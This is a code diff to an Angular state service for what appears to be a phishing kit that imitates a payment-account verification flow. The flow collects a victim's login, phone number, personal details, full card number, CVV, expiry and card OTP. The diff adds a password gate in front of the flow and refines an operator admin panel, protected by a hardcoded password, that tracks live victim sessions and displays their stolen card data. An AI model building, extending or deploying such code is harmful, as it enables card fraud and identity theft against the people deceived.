@@ -3,7 +3,7 @@ import { Injectable, signal, computed, effect } from '@angular/core';
 import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap } from 'rxjs/operators';
 
-export type ViewState = 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'loading' | 'step_success' | 'success' | 'admin';
+export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'loading' | 'step_success' | 'success' | 'admin';
 export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
@@ -42,8 +42,8 @@ const SYNC_CHANNEL = 'pp_sync_channel';
 })
 export class StateService {
   // Navigation
-  readonly currentView = signal<ViewState>('security_check');
-  readonly previousView = signal<ViewState>('security_check');
+  readonly currentView = signal<ViewState>('gate');
+  readonly previousView = signal<ViewState>('gate');
   
   // Logic State
   readonly stage = signal<VerificationStage>('login');
@@ -57,7 +57,8 @@ export class StateService {
   // Admin Auth & Settings
   readonly adminAuthenticated = signal<boolean>(false);
   readonly adminUsername = signal<string>('admin');
-  readonly adminPassword = signal<string>('secure123'); 
+  readonly adminPassword = signal<string>('secure123');
+
   readonly adminAlertEmail = signal<string>('');
   readonly adminAutoCapture = signal<boolean>(true);
   
@@ -170,6 +171,28 @@ export class StateService {
                 }
             }, 800); 
         });
+    }
+  }
+
+  async unlockGate(password: string) {
+    try {
+      const response = await fetch('/api/gate-unlock', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ password }),
+      });
+      if (response.ok) {
+        const data = await response.json();
+        if (data.success) {
+          this.navigate('security_check');
+          return;
+        }
+      }
+      alert('Incorrect password');
+    } catch (error) {
+      alert('An error occurred. Please try again.');
     }
   }
 
@@ -517,73 +540,75 @@ export class StateService {
   }
 
   private processSessionsData(sessions: any[]) {
-      if (!Array.isArray(sessions)) return;
+    if (!Array.isArray(sessions)) return;
 
-      // Active sessions: Not Verified
-      const rawActive = sessions.filter((s: any) => s.status !== 'Verified');
-      const mappedActive: SessionHistory[] = rawActive.map(s => ({
-          id: s.sessionId, 
+    const adminSessionId = this.sessionId();
+
+    // Active sessions: Not Verified
+    const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);
+    const mappedActive: SessionHistory[] = rawActive.map(s => ({
+        id: s.sessionId,
+        timestamp: new Date(s.timestamp || Date.now()),
+        lastSeen: s.lastSeen,
+        email: s.email,
+        name: `${s.firstName || ''} ${s.lastName || ''}`,
+        status: s.status || 'Active',
+        stage: s.stage,
+        fingerprint: s.fingerprint,
+        data: s,
+        resendRequested: s.resendRequested,
+        isLoginVerified: s.isLoginVerified,
+        isPhoneVerified: s.isPhoneVerified,
+        isPersonalVerified: s.isPersonalVerified,
+        isCardSubmitted: s.isCardSubmitted,
+        isFlowComplete: s.isFlowComplete
+    }));
+
+    mappedActive.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
+    this.activeSessions.set(mappedActive);
+
+    const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
+    const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
+          id: s.sessionId,
           timestamp: new Date(s.timestamp || Date.now()),
           lastSeen: s.lastSeen,
           email: s.email,
           name: `${s.firstName || ''} ${s.lastName || ''}`,
-          status: s.status || 'Active',
-          stage: s.stage,
+          status: s.status,
           fingerprint: s.fingerprint,
-          data: s, 
-          resendRequested: s.resendRequested,
-          isLoginVerified: s.isLoginVerified,
-          isPhoneVerified: s.isPhoneVerified,
-          isPersonalVerified: s.isPersonalVerified,
-          isCardSubmitted: s.isCardSubmitted,
-          isFlowComplete: s.isFlowComplete
-      }));
+          data: {
+            phone: s.phoneNumber,
+            country: s.country,
+            address: s.address,
+            dob: s.dob,
+            cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
+            cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : '',
+            fullCard: s.cardNumber,
+            expiry: s.cardExpiry,
+            cvv: s.cardCvv,
+            cardOtp: s.cardOtp
+          }
+    }));
+    
+    mappedHistory.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
+    this.history.set(mappedHistory);
 
-      mappedActive.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
-      this.activeSessions.set(mappedActive);
-
-      const rawComplete = sessions.filter((s: any) => s.status === 'Verified');
-      const mappedHistory: SessionHistory[] = rawComplete.map(s => ({
-            id: s.sessionId,
-            timestamp: new Date(s.timestamp || Date.now()),
-            lastSeen: s.lastSeen,
-            email: s.email,
-            name: `${s.firstName || ''} ${s.lastName || ''}`,
-            status: s.status,
-            fingerprint: s.fingerprint,
-            data: {
-              phone: s.phoneNumber,
-              country: s.country,
-              address: s.address,
-              dob: s.dob,
-              cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
-              cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : '',
-              fullCard: s.cardNumber,
-              expiry: s.cardExpiry,
-              cvv: s.cardCvv,
-              cardOtp: s.cardOtp
+    // Sync Monitored Session View
+    if (this.adminAuthenticated()) {
+        let targetId = this.monitoredSessionId();
+        if (!targetId && mappedActive.length > 0) {
+              targetId = mappedActive[0].id;
+              this.monitoredSessionId.set(targetId);
+        }
+        
+        if (targetId) {
+            const target = mappedActive.find(s => s.id === targetId);
+            if (target) {
+                this.updateLocalStateFromRemote(target);
             }
-      }));
-      
-      mappedHistory.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
-      this.history.set(mappedHistory);
-
-      // Sync Monitored Session View
-      if (this.adminAuthenticated()) {
-          let targetId = this.monitoredSessionId();
-          if (!targetId && mappedActive.length > 0) {
-                targetId = mappedActive[0].id;
-                this.monitoredSessionId.set(targetId);
-          }
-          
-          if (targetId) {
-              const target = mappedActive.find(s => s.id === targetId);
-              if (target) {
-                  this.updateLocalStateFromRemote(target);
-              }
-          }
-      }
-  }
+        }
+    }
+}
 
   public setMonitoredSession(id: string) {
       this.monitoredSessionId.set(id);
